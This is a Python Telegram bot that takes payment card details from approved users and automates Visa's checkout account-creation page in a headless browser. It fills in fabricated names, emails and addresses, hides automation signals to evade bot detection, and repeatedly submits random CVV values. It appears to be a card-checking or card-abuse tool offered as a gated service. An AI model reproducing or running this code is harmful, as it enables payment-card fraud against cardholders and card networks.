
import os
import json
import time
import random
import asyncio
import platform
from datetime import datetime

import nest_asyncio
import names
import psutil

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from fake_useragent import UserAgent

# ==== Basic Config ====
CHROME_PATH = "/usr/bin/google-chrome"
CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
BOT_ADMIN_ID = int(os.environ.get("BOT_ADMIN_ID", "123456789"))

nest_asyncio.apply()
start_time = datetime.now()

approved_users = set()
approved_users.add(BOT_ADMIN_ID)  # ✅ Auto-approve admin
banned_users = set()

# ==== Helper ====
def is_admin(uid): return uid == BOT_ADMIN_ID

def format_timedelta(td):
    secs = int(td.total_seconds())
    hrs, rem = divmod(secs, 3600)
    mins, secs = divmod(rem, 60)
    return f"{hrs}h {mins}m {secs}s"

def parse_card_input(text: str):
    text = text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    parts = text.split("|")
    if len(parts) != 4:
        return None
    card, mm, yyyy, cvv = parts
    return card, mm.zfill(2), yyyy[-2:], cvv

def get_random_cvv(original, used=set()):
    while True:
        new = ''.join(random.choices('0123456789', k=3))
        if new != original and new not in used:
            used.add(new)
            return new

# ==== Visa Automation ====
async def fill_checkout_form(card_input, update: Update):
    uid = update.effective_user.id
    if uid not in approved_users:
        await update.message.reply_text("🚫 You are not approved to use the bot.")
        return

    parsed = parse_card_input(card_input)
    if not parsed:
        await update.message.reply_text("❌ Invalid format. Use:\n1234567812345678|12|2026|123")
        return

    card, mm, yy, original_cvv = parsed
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    email = f"{first_name.lower()}{random.randint(1000,9999)}@example.com"

    ua = UserAgent()
    options = webdriver.ChromeOptions()
    options.binary_location = CHROME_PATH
    options.add_argument(f"user-agent={ua.random}")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")

    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    service = Service(executable_path=CHROME_DRIVER_PATH)
    driver = webdriver.Chrome(service=service, options=options)
    wait = WebDriverWait(driver, 20)

    try:
        driver.get("https://secure.checkout.visa.com/createAccount")

        # Page 1
        wait.until(EC.presence_of_element_located((By.ID, "firstName"))).send_keys(first_name)
        driver.find_element(By.ID, "lastName").send_keys(last_name)
        driver.find_element(By.ID, "emailAddress").send_keys(email)
        setup_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Set Up']")))
        driver.execute_script("arguments[0].scrollIntoView();", setup_btn)
        ActionChains(driver).move_to_element(setup_btn).click().perform()

        time.sleep(2)
        driver.save_screenshot("page1.png")
        await update.message.reply_photo(photo=open("page1.png", "rb"), caption="📸 Page 1 filled")
        os.remove("page1.png")

        # Page 2
        wait.until(EC.presence_of_element_located((By.ID, "cardNumber-CC"))).send_keys(card)
        driver.find_element(By.ID, "expiry").send_keys(f"{mm}/{yy}")
        driver.find_element(By.ID, "addCardCVV").send_keys(get_random_cvv(original_cvv))
        driver.find_element(By.ID, "first_name").send_keys(first_name)
        driver.find_element(By.ID, "last_name").send_keys(last_name)
        driver.find_element(By.ID, "address_line1").send_keys("123 Elm Street")
        driver.find_element(By.ID, "address_city").send_keys("New York")
        driver.find_element(By.ID, "address_state_province_code").send_keys("NY")
        driver.find_element(By.ID, "address_postal_code").send_keys("10001")
        driver.find_element(By.ID, "address_phone").send_keys("2025550104")

        try:
            country_input = driver.find_element(By.ID, "country_code")
            driver.execute_script("arguments[0].click();", country_input)
            time.sleep(1)
            albania = wait.until(EC.element_to_be_clickable((By.ID, "rf-combobox-1-item-1")))
            driver.execute_script("arguments[0].scrollIntoView();", albania)
            albania.click()
        except Exception:
            pass

        finish_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
        driver.execute_script("arguments[0].scrollIntoView();", finish_btn)
        ActionChains(driver).move_to_element(finish_btn).click().perform()

        time.sleep(2)

        # Page 3 CVV retries
        used_cvvs = set()
        logs = []
        for attempt in range(8):  # ⬅️ Increased from 7 to 8
            new_cvv = get_random_cvv(original_cvv, used_cvvs)
            try:
                cvv_input = wait.until(EC.presence_of_element_located((By.ID, "addCardCVV")))
                cvv_input.clear()
                cvv_input.send_keys(new_cvv)

                finish_btn = driver.find_element(By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")
                driver.execute_script("arguments[0].scrollIntoView();", finish_btn)
                finish_btn.click()
                time.sleep(1)
                logs.append(f"🔁 Try {attempt+1}/8 — CVV: {new_cvv}")
            except:
                logs.append(f"⚠️ Failed attempt {attempt+1}")

        await update.message.reply_text("✅ Automation done!\n" + "\n".join(logs))

    except Exception:
        driver.save_screenshot("fail.png")
        await update.message.reply_photo(photo=open("fail.png", "rb"), caption="❌ Automation failed.")
        os.remove("fail.png")
    finally:
        driver.quit()

# ==== Commands ====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to *Visa Bot!*\n\n"
        "To check commands, use /cmds.\n"
        "Send card in this format:\n"
        "`1234567812345678|12|2026|123`\n"
        "ℹ️ Approval required to run automation.",
        parse_mode="Markdown"
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📚 *Help Guide*\n\n"
        "👉 Format:\n`1234123412341234|MM|YYYY|CVV`\n"
        "✅ Only approved users can run automation.\n"
        "Admins can approve via /approve <id>\n"
        "Use /id to get your Telegram ID.",
        parse_mode="Markdown"
    )

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your Telegram ID: {update.effective_user.id}")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = format_timedelta(datetime.now() - start_time)
    memory = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
    message_time = update.message.date.replace(tzinfo=None)
    ping = int((datetime.now() - message_time).total_seconds() * 1000)

    await update.message.reply_text(
        f"✅ Bot is alive!\n\n"
        f"⏱️ Uptime: {uptime}\n"
        f"📡 Ping: {ping} ms\n"
        f"💾 RAM: {memory:.1f} MB\n"
        f"🖥️ OS: {platform.system()} {platform.release()}")

async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    isadm = is_admin(uid)

    text = "📋 *Command List*\n\n"
    text += "👤 *Basic Commands:*\n"
    text += "/start — Welcome message\n"
    text += "/help — How to use the bot\n"
    text += "/id — Show your Telegram ID\n"
    text += "/status — Show bot status\n"
    text += "/cmds — Show command list\n\n"

    if isadm:
        text += "🛠️ *Admin Commands:*\n"
        text += "/approve <id> — Approve user\n"
        text += "/remove <id> — Remove user\n"
        text += "/ban <id> — Ban user\n"
        text += "/unban <id> — Unban user\n"
        text += f"\n✅ Approved Users: {len(approved_users)}"

    await update.message.reply_text(text, parse_mode="Markdown")

# === Admin only ===
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid = int(context.args[0])
        approved_users.add(uid)
        await update.message.reply_text(f"✅ Approved {uid}")
    except: await update.message.reply_text("❌ Usage: /approve <id>")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid = int(context.args[0])
        approved_users.discard(uid)
        await update.message.reply_text(f"🗑️ Removed {uid}")
    except: await update.message.reply_text("❌ Usage: /remove <id>")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid = int(context.args[0])
        banned_users.add(uid)
        await update.message.reply_text(f"🚫 Banned {uid}")
    except: await update.message.reply_text("❌ Usage: /ban <id>")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid = int(context.args[0])
        banned_users.discard(uid)
        await update.message.reply_text(f"✅ Unbanned {uid}")
    except: await update.message.reply_text("❌ Usage: /unban <id>")

# === Message Handler ===
async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    await update.message.reply_text("⏳ Processing automation...")
    await fill_checkout_form(update.message.text, update)

# === Main Bot ===
async def main():
    token = os.environ.get("BOT_TOKEN")
    app = ApplicationBuilder().token(token).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("cmds", cmds_cmd))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_msg))

    print("🤖 Bot is running...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
